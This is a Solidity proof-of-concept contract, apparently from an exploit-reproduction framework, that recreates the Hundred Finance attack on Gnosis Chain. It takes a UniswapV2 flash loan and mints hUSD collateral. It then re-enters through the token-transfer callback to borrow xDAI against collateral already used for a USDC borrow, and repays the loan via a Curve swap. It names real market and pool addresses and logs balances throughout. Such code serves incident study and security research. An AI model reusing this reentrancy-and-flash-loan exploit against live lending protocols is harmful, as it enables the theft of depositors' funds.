pragma solidity ^0.8.0;

import "../src/flashloan/FlashLoan.sol";
import "../src/reentrancy/Reentrancy.sol";
import "../src/tokens/Tokens.sol";
import "../src/PoC.sol";

import "forge-std/interfaces/IERC20.sol";
import "forge-std/console.sol";

contract HundredFinanceHack is FlashLoan, Reentrancy, PoC {
    // Hundred Finance Markets on Gnosis Chain
    IERC20 constant husd = IERC20(0x243E33aa7f6787154a8E59d3C27a66db3F8818ee);
    IERC20 constant hxdai = IERC20(0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE);
    IERC20 constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);
    // Curve exchange address to swap tokens for flash loan repayment
    ICurve constant curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    bool borrowedXdai;
    uint256 totalFlashloaned;

    function initiateAttack() external {
        // Setup token pair and amounts to flash loan from UniswapV2
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = GnosisTokens.USDC;
        tokens[1] = wxdai;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 2117765617657;
        amounts[1] = 0;

        setAlias(address(this), "Attacker");

        // Trigger the flash loan from the passed provider
        // This will call _executeAttack which has logic to determine if it's in the flash loan callback
        takeFlashLoan(FlashLoanProviders.UNISWAPV2, tokens, amounts);
    }

    function _executeAttack() internal override(FlashLoan, Reentrancy) {
        if (msg.sig == this.onTokenTransfer.selector) {
            // Check we entered _executeAttack from the token callback
            // Decode the parameters passed to the token transfer callback, `onTokenTransfer(address, uint256, bytes memory)`
            (address from,,) = abi.decode(msg.data[4:], (address, uint256, bytes));

            // If we're currently borrowing usdc and we haven't already borrowed xdai,
            // reenter a different Hundred Finance market and borrow xdai tokens
            if (from == address(husd) && !borrowedXdai) {
                borrowedXdai = true;
                uint256 amount = (totalFlashloaned * 1e12) * 60 / 100;

                // Borrow xdai agaist the same usdc collateral, since the initial borrow transaction hasn't been completed
                // we can reuse the collateral
                ICompoundToken(address(hxdai)).borrow(amount);
            }
        }
        // Check that our current flash loan provider is UniswapV2
        else if (currentFlashLoanProvider() == FlashLoanProviders.UNISWAPV2) {
            // Attacker USDC balance before borrow
            console.log("Attacker USDC and xdai balances after flash loan");
            IERC20[] memory tokens = new IERC20[](2);
            tokens[0] = GnosisTokens.USDC;
            tokens[1] = IERC20(address(0x0));
            snapshotAndPrint(address(this), tokens);

            // Decode the parameters passed to the flash loan callback function, `uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data)`
            (, uint256 amount0, uint256 amount1,) = abi.decode(msg.data[4:], (address, uint256, uint256, bytes));
            totalFlashloaned = amount0 == 0 ? amount1 : amount0;

            // Deposit usdc to Hundred Finance as collateral and receive husd in return
            uint256 balance = GnosisTokens.USDC.balanceOf(address(this));
            GnosisTokens.USDC.approve(address(husd), balance);
            ICompoundToken(address(husd)).mint(balance);

            IERC20[] memory tokens2 = new IERC20[](2);
            tokens2[0] = GnosisTokens.USDC;
            tokens2[1] = husd;
            console.log("Attacker USDC and hUSD balances after mint");
            snapshotAndPrint(address(this), tokens2);

            // Borrow usdc agaist our minted husd
            // This triggers a token callback on our contract through the transfer of usdc
            uint256 amount = (totalFlashloaned * 90) / 100;
            ICompoundToken(address(husd)).borrow(amount);

            // Attacker USDC and xdai balances after borrow
            console.log("Attacker USDC and xdai balances after borrow attack");
            snapshotAndPrint(address(this), tokens);
        }
    }

    function _completeAttack() internal override(FlashLoan, Reentrancy) {
        // Swap xdai to usdc to repay our flash loan
        IWETH(payable(address(wxdai))).deposit{value: address(this).balance}();
        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);
        console.log("Attacker USDC and xdai balance after swap");
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = GnosisTokens.USDC;
        tokens[1] = IERC20(address(0x0));
        snapshotAndPrint(address(this), tokens);
    }

    // Our contract needs to implement this function to be able to receive Gnosis chain's native asset, xdai
    receive() external payable override {}

    function _reentrancyCallback() internal override {
        // Overrided to silence the console log
        _executeAttack();
    }

    fallback() external payable override(FlashLoan, Reentrancy) {
        // Default to the flash loan fallback logic
        FlashLoan._fallback();
    }
}

interface ICompoundToken {
    function borrow(uint256) external;
    function mint(uint256) external;
    function comptroller() external view returns (address);
}

interface IWETH {
    function deposit() external payable;
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
}
